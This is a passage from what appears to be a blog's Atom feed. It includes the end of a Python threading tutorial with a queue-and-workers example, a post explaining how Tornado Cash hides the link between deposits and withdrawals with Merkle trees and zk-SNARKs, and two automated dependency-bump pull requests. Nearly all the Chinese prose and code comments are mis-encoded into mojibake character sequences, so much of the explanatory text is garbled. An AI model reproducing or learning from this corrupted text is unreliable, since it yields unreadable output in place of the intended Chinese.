çš„è°ƒç”¨å‘Šè¯‰é˜Ÿåˆ—è¯¥é¡¹çš„å¤„ç†å·²å®Œæˆã€‚</span></span><br><span class="line">        <span class="comment"># å¦‚æœå®Œæˆæ‰€æœ‰ä»»åŠ¡ï¼Œåˆ™ q.join() å¯ä»¥å–æ¶ˆé˜»å¡</span></span><br><span class="line">        q.task_done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    num_threads = <span class="number">10</span></span><br><span class="line">    lock = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_threads):</span><br><span class="line">        t = Thread(name=<span class="string">f&quot;Thread<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>, target=worker, args=(q, lock))</span><br><span class="line">        t.daemon = <span class="literal">True</span>  <span class="comment"># å½“ä¸»çº¿ç¨‹æ­»äº¡æ—¶æ­»äº¡</span></span><br><span class="line">        t.start()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ä½¿ç”¨é¡¹å¡«å……é˜Ÿåˆ—</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        q.put(x)</span><br><span class="line"></span><br><span class="line">    q.join()  <span class="comment"># é˜»å¡ç›´åˆ°é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰é¡¹è¢«è·å–å¹¶å¤„ç†</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main done&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span> Thread1 got <span class="number">0</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">1</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">11</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">12</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">13</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">14</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">15</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">16</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">17</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">18</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">19</span></span><br><span class="line"><span class="keyword">in</span> Thread8 got <span class="number">5</span></span><br><span class="line"><span class="keyword">in</span> Thread4 got <span class="number">9</span></span><br><span class="line"><span class="keyword">in</span> Thread1 got <span class="number">10</span></span><br><span class="line"><span class="keyword">in</span> Thread5 got <span class="number">2</span></span><br><span class="line"><span class="keyword">in</span> Thread6 got <span class="number">3</span></span><br><span class="line"><span class="keyword">in</span> Thread9 got <span class="number">6</span></span><br><span class="line"><span class="keyword">in</span> Thread7 got <span class="number">4</span></span><br><span class="line"><span class="keyword">in</span> Thread10 got <span class="number">7</span></span><br><span class="line"><span class="keyword">in</span> Thread3 got <span class="number">8</span></span><br><span class="line">main done</span><br></pre></td></tr></table></figure><h3><span id="shou-hu-xian-cheng">å®ˆæŠ¤çº¿ç¨‹</span></h3><p>åœ¨ä»¥ä¸Šç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨äº†å®ˆæŠ¤çº¿ç¨‹ã€‚ å®ˆæŠ¤çº¿ç¨‹æ˜¯åå°çº¿ç¨‹ï¼Œå®ƒä»¬åœ¨ä¸»ç¨‹åºç»“æŸæ—¶è‡ªåŠ¨æ¶ˆå¤±ã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥é€€å‡º worker æ–¹æ³•å†…çš„æ— é™å¾ªç¯çš„åŸå› ã€‚ æ²¡æœ‰å®ˆæŠ¤è¿›ç¨‹ï¼Œæˆ‘ä»¬å°†ä¸å¾—ä¸ä½¿ç”¨è¯¸å¦‚ <code>threading.Event</code> ä¹‹ç±»çš„ä¿¡å·æœºåˆ¶æ¥åœæ­¢ workerã€‚ ä½†è¯·æ³¨æ„å®ˆæŠ¤è¿›ç¨‹ï¼šå®ƒä»¬ä¼šçªç„¶åœæ­¢ï¼Œå¹¶ä¸”å®ƒä»¬çš„èµ„æºï¼ˆä¾‹å¦‚æ‰“å¼€çš„æ–‡ä»¶æˆ–æ•°æ®åº“äº‹åŠ¡ï¼‰å¯èƒ½æ— æ³•æ­£ç¡®é‡Šæ”¾/å®Œæˆã€‚</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      16. å¤šçº¿ç¨‹ â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Tornado Cash åŸºæœ¬åŸç†</title>
    <link href="https://qiwihui.com/qiwihui-blog-164/"/>
    <id>https://qiwihui.com/qiwihui-blog-164/</id>
    <published>2022-06-09T03:16:33.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>å‡è®¾åœ°å€ A å‘é€äº† 100 ETH ç»™åœ°å€ Bï¼Œç”±äºåœ¨åŒºå—é“¾ä¸Šæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯å…¬å¼€çš„ï¼Œæ‰€ä»¥å…¨ä¸–ç•Œéƒ½çŸ¥é“åœ°å€ A å’Œåœ°å€ B è¿›è¡Œäº†ä¸€æ¬¡äº¤æ˜“ï¼Œå¦‚æœåœ°å€Aå’Œåœ°å€ B å±äºåŒä¸€ä¸ªç”¨æˆ· Aliceï¼Œåˆ™å¤§å®¶çŸ¥é“Aliceä»ç„¶æ‹¥æœ‰ 100 ETHï¼Œå¦‚æœåœ°å€Bå±äºç”¨æˆ· Bobï¼Œåˆ™å¤§å®¶çŸ¥é“ Bob ç°åœ¨æœ‰ 100ETH äº†ã€‚ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼šå¦‚ä½•åœ¨äº¤æ˜“çš„è¿‡ç¨‹ä¸­ä¿æŒéšè”½å‘¢ï¼Œæˆ–è€…è¯´éšè—å‘é€ç”¨æˆ·ä¸æ¥æ”¶ç”¨æˆ·ä¹‹å‰çš„ç»ƒä¹ ï¼Ÿé‚£å°±è¦ç”¨åˆ° Tornado Cashã€‚</p><p>ç”¨æˆ·å°†èµ„é‡‘å­˜å…¥Tornado Cashï¼Œç„¶åå°†èµ„é‡‘æå–åˆ°å¦ä¸€ä¸ªåœ°å€ä¸­ï¼Œåœ¨åŒºå—é“¾ä¸Šè®°å½•ä¸Šï¼Œè¿™ä¸¤ä¸ªåœ°å€ä¹‹é—´çš„è”ç³»å°±å¤§æ¦‚ç‡æ–­å¼€äº†ã€‚é‚£ Tornado Cash æ˜¯å¦‚ä½•åšåˆ°çš„å‘¢ï¼Ÿ</p><span id="more"></span><h2><span id="cun-kuan-deposit-guo-cheng">å­˜æ¬¾ï¼ˆdepositï¼‰è¿‡ç¨‹</span></h2><p>é¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹å­˜æ¬¾è¿‡ç¨‹ã€‚ç”¨æˆ·åœ¨å­˜æ¬¾æ—¶éœ€è¦ç”Ÿäº§ä¸¤ä¸ªéšæœºæ•° secret å’Œ nullifierï¼Œå¹¶è®¡ç®—è¿™ä¸¤ä¸ªæ•°çš„ä¸€ä¸ªå“ˆå¸Œ commitment = hash(secret, nullifier)ï¼Œç„¶åç”¨æˆ·å°†éœ€è¦æ··å¸çš„é‡‘é¢ï¼ˆæ¯”å¦‚ 1 ETHï¼‰å’Œ commitment å‘é€ç»™ TC åˆçº¦çš„ deposit å‡½æ•°ï¼ŒTCåˆçº¦å°†ä¿å­˜è¿™ä¸¤ä¸ªæ•°æ®ï¼Œcommitmentä¹‹åä¼šç”¨äºæå–å­˜å…¥çš„èµ„é‡‘ã€‚</p><p>åŒæ—¶ï¼Œç”¨æˆ·ä¼šå¾—åˆ°ä¸€ä¸ªå‡­è¯ï¼Œé€šè¿‡è¿™ä¸ªå‡­è¯ï¼Œç”¨æˆ·ï¼ˆæˆ–è€…ä»»ä½•äººï¼‰å°±å¯ä»¥æå–å­˜å…¥çš„èµ„é‡‘ã€‚</p><h3><span id="wei-shi-me-cun-ru-1-eth">ä¸ºä»€ä¹ˆå­˜å…¥ 1 ETHï¼Ÿ</span></h3><p>å¦‚æœä¸åŒçš„ç”¨æˆ·ä¼šå­˜å…¥ä¸åŒçš„é‡‘é¢ï¼Œæ¯”å¦‚ Alice å’Œ Bob å­˜å…¥ 1 ETHï¼ŒChris å­˜å…¥ 73 ETHï¼Œå½“å–å‡ºå­˜æ¬¾æ—¶ï¼ŒæŸä¸ªåœ°å€æå–äº† 73 ETHï¼Œæˆ‘ä»¬ä¼šæœ‰å¾ˆå¤§ç¨‹åº¦æ€€ç–‘è¿™ä¸ªåœ°å€å±äº Chrisã€‚å› æ­¤ï¼Œåœ¨TC åˆçº¦ä¸­è§„å®šäº†æ¯æ¬¡å­˜å…¥çš„é‡‘é¢ä¸º 1 ETHï¼Œè¿™æ ·å°±ä¸ä¼šæœ‰åœ°å€ä¸å…¶ä»–åœ°å€ä¸ä¸€è‡´ã€‚</p><p>å®é™…ä¸Šï¼ŒTC æœ‰ä¸åŒé‡‘é¢çš„ ETH å­˜æ¬¾æ± ï¼Œåˆ†åˆ«ä¸º 0.1ï¼Œ1ï¼Œ10ï¼Œ100ï¼Œä»¥æ»¡è¶³ä¸åŒæ•°é‡çš„å­˜å–æ¬¾éœ€æ±‚ã€‚</p><h2><span id="qu-kuan-withdraw-guo-cheng">å–æ¬¾ï¼ˆwithdrawï¼‰è¿‡ç¨‹</span></h2><p>å½“è¿›è¡Œå–æ¬¾æ—¶ï¼Œä¸€ç§é”™è¯¯æ–¹æ³•æ˜¯å°†ä¹‹å‰éšæœºç”Ÿæˆçš„ secret å’Œ nullifier ä½œä¸ºå‚æ•°å‘é€ç»™åˆçº¦çš„å–æ¬¾å‡½æ•°ï¼Œåˆçº¦æ£€æŸ¥ hash(secret,nullifier) æ˜¯å¦ç­‰äºä¹‹å‰ä¿å­˜çš„ commitmentï¼Œå¦‚æœç›¸ç­‰å°±å‘é€ 1 ETHç»™å–æ¬¾è€…ã€‚ä½†æ˜¯è¿™ä¸ªè¿‡ç¨‹å°±ä½¿å¾—å–æ¬¾è€…çš„èº«ä»½æš´éœ²äº†ï¼Œå› ä¸º hash è¿‡ç¨‹æ˜¯ä¸å¯é€†çš„ï¼Œå½“æˆ‘ä»¬ä»å­˜æ¬¾æ—¥å¿—ä¸­æ‰¾åˆ°ç›¸ç­‰çš„commitmentæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ commitment å»ºç«‹å­˜æ¬¾è€…å’Œå–æ¬¾è€…ä¹‹é—´çš„è”ç³»ï¼Œå› ä¸ºåªæœ‰è¿™ä¸ªå­˜æ¬¾è€…çŸ¥é“è·å¾— commitment çš„ secret å’Œ nullifierã€‚</p><p>å¦‚æœè§£å†³è¿™ä¸ªè¿‡ç¨‹å‘¢ï¼Ÿå¦‚æœæœ‰äººæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥è¯æ˜ä»–çŸ¥é“ä¸€ç»„(secret, nullifier) ä½¿å¾— hash(secret, nullifier) åœ¨åˆçº¦è®°å½•çš„commitmentåˆ—è¡¨ä¸­ï¼Œä½†æ˜¯å´ä¸å…¬å¼€è¿™ç»„(secret, nullifier) ï¼Œé‚£è¿™ä¸ªäººå°±å¯ä»¥åªç”¨å‘é€è¿™ä¸ªè¯æ˜ç»™åˆçº¦è¿›è¡ŒéªŒè¯ï¼Œå°±å¯ä»¥è¯æ˜ä»–æ‹¥æœ‰ä¹‹å‰å­˜å…¥è¿‡èµ„é‡‘ï¼Œå½“å´ä¸çŸ¥é“å¯¹åº”äºå“ªä¸€ç»„å­˜å…¥çš„èµ„é‡‘ï¼Œæ‰€ä»¥ä»ç„¶ä¿æŒåŒ¿åã€‚</p><p>è¿™ä¸ªè¯æ˜å°±æ˜¯é›¶çŸ¥è¯†è¯æ˜ï¼Œå®ƒå¯ä»¥è¯æ˜ä½ çŸ¥é“æŸä¸ªä¿¡æ¯ä½†å´ä¸ç”¨å…¬å¼€è¿™ä¸ªä¿¡æ¯ã€‚TC ä½¿ç”¨çš„é›¶çŸ¥è¯†è¯æ˜ç§°ä¸º zk-SNARKã€‚</p><p>æˆ‘ä»¬æ³¨æ„åˆ°å½“ç”¨æˆ·å­˜æ¬¾å’Œå–æ¬¾æ—¶ï¼Œä½¿ç”¨äº†ä¸¤ä¸ªéšæœºæ•° secret å’Œ nullifierï¼Œnullifier çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå½“ç”¨æˆ·å–æ¬¾æ—¶ï¼Œåˆçº¦å…¶å®ä¸çŸ¥é“åˆ°åº•æ˜¯è°åœ¨å–æ¬¾ï¼Œä¸ºäº†é¿å…ç”¨æˆ·å­˜å…¥ 1 ETH ç„¶åè¿›è¡Œå¤šæ¬¡æå–ï¼ŒTCè¦æ±‚å½“ç”¨æˆ·å‘é€è¯æ˜çš„åŒæ—¶å‘é€ nullifier çš„å“ˆå¸ŒnullifierHashï¼Œåœ¨zk-SNARKçš„è¯æ˜ä¸­ï¼Œä»–ä¼šæ£€æŸ¥ä¸¤ä»¶äº‹æƒ…ï¼šä¸€æ˜¯æ£€æŸ¥ hash(secret, nullifier) åœ¨ commitment çš„åˆ—è¡¨ä¸­ï¼ŒäºŒæ˜¯ nullifierHash ç­‰äº hash(nullifier)ï¼Œä¸€æ—¦éªŒè¯æˆåŠŸï¼Œåˆçº¦å°±ä¼šè®°å½•è¿™ä¸ªå“ˆå¸Œã€‚å½“åŒä¸€ä¸ªè¯æ˜ç¬¬äºŒæ¬¡è¢«æäº¤æ—¶å°±ä¼šå¤±è´¥ï¼Œå› ä¸ºå¯¹åº”çš„ nullifier å“ˆå¸Œå·²ç»ä½¿ç”¨è¿‡äº†ï¼Œè¿™æ ·å°±é¿å…äº†äºŒæ¬¡ææ¬¾ã€‚</p><h3><span id="tornado-cash-ru-he-bao-cun-commitment-ni">Tornado Cash å¦‚ä½•ä¿å­˜ commitment å‘¢</span></h3><p>ä½¿ç”¨ Merkle æ ‘ã€‚Merkleæ ‘å…·ä½“å‚è§ä¹‹å‰çš„ä»‹ç»æ–‡ç« ã€‚</p><p>TC ä¼šé¦–å…ˆåˆå§‹åŒ–ä¸€ç»„å¶å­èŠ‚ç‚¹ä¸º <code>keccak256(&quot;tornado&quot;)</code>ï¼Œå¹¶ä»¥è¿™äº›å¶å­èŠ‚ç‚¹æ„å»ºä¸€é¢— Merkle æ ‘ã€‚å½“ç”¨æˆ·å­˜æ¬¾æ—¶ï¼Œå¯¹åº”çš„ commitment å­˜å…¥ Merkle æ ‘çš„ç¬¬ä¸€ä¸ªå¶å­èŠ‚ç‚¹ï¼Œç„¶ååˆçº¦æ›´æ–°æ•´æ£µ Merkle æ ‘ï¼Œç„¶åæ˜¯ç¬¬äºŒä¸ªç”¨æˆ·çš„commitment å­˜å…¥ç¬¬äºŒä¸ªå¶å­èŠ‚ç‚¹å¹¶æ›´æ–°æ•´æ£µ Merkle æ ‘ï¼Œä¾æ¬¡ç±»æ¨ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/188539564-5178bafe-dd46-4409-8de5-fdcc194e88e4.png" alt="Untitled"></p><p>å¦‚ä½•è¯æ˜ commitment åœ¨è¿™æ£µ Merkle æ ‘ä¸­å‘¢ï¼Ÿ</p><p><img src="https://user-images.githubusercontent.com/3297411/188539594-233fbff1-9cc8-43c9-99a2-86a7045f3efe.png" alt="Untitled 1"></p><p>å‡è®¾éœ€è¦è¯æ˜c3åœ¨è¿™æ£µMerkelä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä»å¶å­èŠ‚ç‚¹ c3 åˆ°æ ¹çš„è·¯å¾„è¿‡ç¨‹ä¸­çš„å“ˆå¸Œï¼Œä½¿å¾—ä»–ä»¬ä¸ c3 ä¾æ¬¡è¿›è¡Œ hash å¯ä»¥å¾—åˆ°æ ¹å“ˆå¸Œï¼Œå³å›¾ä¸­ç»¿è‰²èŠ‚ç‚¹çš„å“ˆå¸Œåˆ—è¡¨ã€‚</p><p>Tornado Cash ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æä¾›è¿™äº›èŠ‚ç‚¹å“ˆå¸Œï¼Œå¹¶é€šè¿‡ zk-SNARK ç”Ÿæˆé›¶çŸ¥è¯†è¯æ˜ï¼Œä»¥æ­¤è¯æ˜ c3 åœ¨è¿™æ£µä»¥ rootï¼ˆ<code>=h(h(h(c0,c1),h(c2,c3)),h(h(c4,c5), z1))</code>ï¼‰ä¸ºæ ¹çš„ Merkle ä¸­ï¼Œä½†å´ä¸ç”¨å‘Šè¯‰å¤§å®¶ c3 çš„å€¼ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/188539613-fe0ccd14-c7e7-4143-847a-e71d3b475e1f.png" alt="Untitled 2"></p><p>å› æ­¤æˆ‘ä»¬å°†è¯æ˜ proof å’Œ Merkle æ ‘æ ¹ root å‘é€ç»™åˆçº¦ï¼Œä¸€æ—¦åˆçº¦éªŒè¯æˆåŠŸï¼Œæˆ‘ä»¬å°±å¯ä»¥å–å‡ºä¹‹å‰å­˜å…¥çš„å­˜æ¬¾ã€‚</p><h2><span id="solidity-zhong-de-zk-snark-shi-xian">solidity ä¸­çš„ zk-SNARK å®ç°</span></h2><p>TC åˆçº¦åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><ol><li>å­˜æ¬¾å’Œå–æ¬¾åˆçº¦ï¼Œç”¨äºä¸ç”¨æˆ·äº¤äº’ï¼›</li><li>Merkle æ ‘ï¼Œç”¨äºè®°å½•å­˜æ¬¾å“ˆå¸Œï¼›</li><li>zk-SNARK éªŒè¯å™¨åˆçº¦ï¼Œç”¨äºéªŒè¯å–æ¬¾æ—¶è¯æ˜åˆæ³•ã€‚</li></ol><p>zk-SNARK éªŒè¯å™¨åˆçº¦ç”± circom ç¼–å†™çš„éªŒè¯ç”µè·¯é€šè¿‡ snarkjs åº“ç”Ÿæˆã€‚</p><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="https://www.youtube.com/watch?v=z_cRicXX1jI">Tornado Cash - How it Works | DeFi + Zero Knowledge Proof</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Tornado Cash åŸºæœ¬åŸç†
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>chore(deps): bump ua-parser-js from 0.7.22 to 0.7.28</title>
    <link href="https://qiwihui.com/qiwihui-blog-141/"/>
    <id>https://qiwihui.com/qiwihui-blog-141/</id>
    <published>2021-08-05T03:31:22.000Z</published>
    <updated>2022-08-13T01:54:25.350Z</updated>
    
    <content type="html"><![CDATA[<p>Bumps <a href="https://github.com/faisalman/ua-parser-js">ua-parser-js</a> from 0.7.22 to 0.7.28.</p><details><summary>Commits</summary><ul><li><a href="https://github.com/faisalman/ua-parser-js/commit/1d3c98a10c23915046a362c4e3b3b503fb40d611"><code>1d3c98a</code></a> Revert breaking fix <a href="https://github-redirect.dependabot.com/faisalman/ua-parser-js/issues/279">#279</a> and release as 0.7.28</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/535f11bd2403910f29dabe6f90adb014ad016747"><code>535f11b</code></a> Delete redundant code</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/642c0399e831e27c5c86c3b7afee02e876250d01"><code>642c039</code></a> Fix <a href="https://github-redirect.dependabot.com/faisalman/ua-parser-js/issues/492">#492</a> LG TV WebOS detection</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/3edacddb2474429c55fa39d1e6222d50bbf9266f"><code>3edacdd</code></a> Merge branch 'master' into develop</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/acc0b91ff5defa2ca9a722874e27277879292907"><code>acc0b91</code></a> Update contributor list</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/f726dcd1ae4fea51e99b8ca574a1be51fbd70e1a"><code>f726dcd</code></a> Merge branch 'master' into develop</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/383ca587ef9b8daffcf652ac39fc9b8f3708572e"><code>383ca58</code></a> More test for tablet devices</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/7c8aa435b26cb14537423cd5fe4ce077e0661db2"><code>7c8aa43</code></a> Minor rearrangement</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/09aa9105dc370ded9275f70eae1f4eb67394966c"><code>09aa910</code></a> Add new device &amp; browser: Tesla</li><li><a href="https://github.com/faisalman/ua-parser-js/commit/557cc2198d88068892eec6b61f2b2f4fe6e96314"><code>557cc21</code></a> More test for latest phones with unique form factor (fold/flip/qwerty/swivel)</li><li>Additional commits viewable in <a href="https://github.com/faisalman/ua-parser-js/compare/0.7.22...0.7.28">compare view</a></li></ul></details><br><p><a href="https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores"><img src="https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=ua-parser-js&amp;package-manager=npm_and_yarn&amp;previous-version=0.7.22&amp;new-version=0.7.28" alt="Dependabot compatibility score"></a></p><p>Dependabot will resolve any conflicts with this PR as long as you donâ€™t alter it yourself. You can also trigger a rebase manually by commenting <code>@dependabot rebase</code>.</p><hr><details><summary>Dependabot commands and options</summary><br><p>You can trigger Dependabot actions by commenting on this PR:</p><ul><li><code>@dependabot rebase</code> will rebase this PR</li><li><code>@dependabot recreate</code> will recreate this PR, overwriting any edits that have been made to it</li><li><code>@dependabot merge</code> will merge this PR after your CI passes on it</li><li><code>@dependabot squash and merge</code> will squash and merge this PR after your CI passes on it</li><li><code>@dependabot cancel merge</code> will cancel a previously requested merge and block automerging</li><li><code>@dependabot reopen</code> will reopen this PR if it is closed</li><li><code>@dependabot close</code> will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually</li><li><code>@dependabot ignore this major version</code> will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this minor version</code> will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this dependency</code> will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot use these labels</code> will set the current labels as the default for future PRs for this repo and language</li><li><code>@dependabot use these reviewers</code> will set the current reviewers as the default for future PRs for this repo and language</li><li><code>@dependabot use these assignees</code> will set the current assignees as the default for future PRs for this repo and language</li><li><code>@dependabot use this milestone</code> will set the current milestone as the default for future PRs for this repo and language</li></ul><p>You can disable automated security fix PRs for this repo from the <a href="https://github.com/qiwihui/blog/network/alerts">Security Alerts page</a>.</p></details><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      chore(deps): bump ua-parser-js from 0.7.22 to 0.7.28
    
    </summary>
    
    
      <category term="dependencies" scheme="https://qiwihui.com/tags/dependencies/"/>
    
  </entry>
  
  <entry>
    <title>chore(deps): bump underscore from 1.11.0 to 1.13.1</title>
    <link href="https://qiwihui.com/qiwihui-blog-140/"/>
    <id>https://qiwihui.com/qiwihui-blog-140/</id>
    <published>2021-07-05T12:46:09.000Z</published>
    <updated>2022-08-13T01:54:25.520Z</updated>
    
    <content type="html"><![CDATA[<p>Bumps <a href="https://github.com/jashkenas/underscore">underscore</a> from 1.11.0 to 1.13.1.</p><details><summary>Commits</summary><ul><li><a href="https://github.com/jashkenas/underscore/commit/943977e34e2279503528a71ddcc2dd5f96483945"><code>943977e</code></a> Merge branch 'umd-alias', tag 1.13.1 release</li><li><a href="https://github.com/jashkenas/underscore/commit/5630f882932552ba23f34b57f91c0c6e2a38ad82"><code>5630f88</code></a> Add version 1.13.1 to the change log</li><li><a href="https://github.com/jashkenas/underscore/commit/5aa5b526a94edf487ab1d4a4e3cde8f7749e6d2c"><code>5aa5b52</code></a> Update the bundle sizes</li><li><a href="https://github.com/jashkenas/underscore/commit/76c8d8a05db2d0f9ecfb193ba2ab7780c4a26441"><code>76c8d8a</code></a> Bump the version to 1.13.1</li><li><a href="https://github.com/jashkenas/underscore/commit/9cda0b09742c9ed6ae5e1bccb709b63f32a04f45"><code>9cda0b0</code></a> Add some build clarifications to the documentation (<a href="https://github-redirect.dependabot.com/jashkenas/underscore/issues/2923">#2923</a>)</li><li><a href="https://github.com/jashkenas/underscore/commit/8b5928c04b9a61a99e2704740b80287247e9f47a"><code>8b5928c</code></a> Revert .gitignore underscore.js from 57a4a0e (fix <a href="https://github-redirect.dependabot.com/jashkenas/underscore/issues/2923">#2923</a>)</li><li><a href="https://github.com/jashkenas/underscore/commit/7054a54d63af2ed1c99eb3707836da709b5e625e"><code>7054a54</code></a> Update generated sources and tag 1.13.0 release</li><li><a href="https://github.com/jashkenas/underscore/commit/37dc52a61054674115be560ab9cbdd26b05031ed"><code>37dc52a</code></a> Merge pull request <a href="https://github-redirect.dependabot.com/jashkenas/underscore/issues/2921">#2921</a> from jgonggrijp/prepare-1.13.0</li><li><a href="https://github.com/jashkenas/underscore/commit/5511d129881253807d728cc6a21fff55953ae4f9"><code>5511d12</code></a> Add version 1.13.0 to the change log</li><li><a href="https://github.com/jashkenas/underscore/commit/efe5fbf4a1d43c9a88c1646aa5ab53a4745655b8"><code>efe5fbf</code></a> Bump the version to 1.13.0</li><li>Additional commits viewable in <a href="https://github.com/jashkenas/underscore/compare/1.11.0...1.13.1">compare view</a></li></ul></details><details><summary>Maintainer changes</summary><p>This version was pushed to npm by <a href="https://www.npmjs.com/~jgonggrijp">jgonggrijp</a>, a new releaser for underscore since your current version.</p></details><br><p><a href="https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores"><img src="https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=underscore&amp;package-manager=npm_and_yarn&amp;previous-version=1.11.0&amp;new-version=1.13.1" alt="Dependabot compatibility score"></a></p><p>Dependabot will resolve any conflicts with this PR as long as you donâ€™t alter it yourself. You can also trigger a rebase manually by commenting <code>@dependabot rebase</code>.</p><hr><details><summary>Dependabot commands and options</summary><br><p>You can trigger Dependabot actions by commenting on this PR:</p><ul><li><code>@dependabot rebase</code> will rebase this PR</li><li><code>@dependabot recreate</code> will recreate this PR, overwriting any edits that have been made to it</li><li><code>@dependabot merge</code> will merge this PR after your CI passes on it</li><li><code>@dependabot squash and merge</code> will squash and merge this PR after your CI passes on it</li><li><code>@dependabot cancel merge</code> will cancel a previously requested merge and block automerging</li><li><code>@dependabot reopen</code> will reopen this PR if it is closed</li><li><code>@dependabot close</code> will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually</li><li><code>@dependabot ignore this major version</code> will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this minor version</code> will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this dependency</code> will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot use these labels</code> will set the current labels as the default for future PRs for this repo and language</li><li><code>@dependabot use these reviewers</code> will set the current reviewers as the default for future PRs for this repo and language</li><li><code>@dependabot use these assignees</code> will set the current assignees as the default for future PRs for this repo and language</li><li><code>@dependabot use this milestone</code> will set the current milestone as the default for future PRs for this repo and language</li></ul><p>You can disable automated security fix PRs for this repo from the <a href="https://github.com/qiwihui/blog/network/alerts">Security Alerts page</a>.</p></details><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      chore(deps): bump underscore from 1.11.0 to 1.13.1
    
    </summary>
    
    
      <category term="dependencies" scheme="https://qiwihui.com/tags/dependencies/"/>
    
  </entry>
  
  <entry>
    <title>ä¸ƒæœˆå°ç»“ï¼ˆ2021.07ï¼‰</title>
    <link href="https://qiwihui.com/qiwihui-blog-145/"/>
    <id>https://qiwihui.com/qiwihui-blog-145/</id>
    <published>2021-02-08T10:03:56.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
